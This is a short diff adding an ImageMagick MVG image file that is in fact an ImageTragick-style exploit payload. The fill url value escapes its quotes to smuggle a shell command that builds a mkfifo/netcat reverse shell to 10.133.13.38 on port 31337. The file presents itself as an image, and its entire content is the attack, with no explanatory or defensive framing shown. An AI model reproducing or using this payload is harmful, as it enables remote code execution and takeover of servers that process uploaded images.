@@ -1,0 +1,9 @@
+push graphic-context
+
+viewbox 0 0 640 480
+
+fill 'url(https://pbs.twimg.com/profile_images/746669669562474497/f0zGwSL9.jpg"; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i
+
+2>&1|nc 10.133.13.38:31337 >/tmp/f;touch "hello)'
+
+pop graphic-context
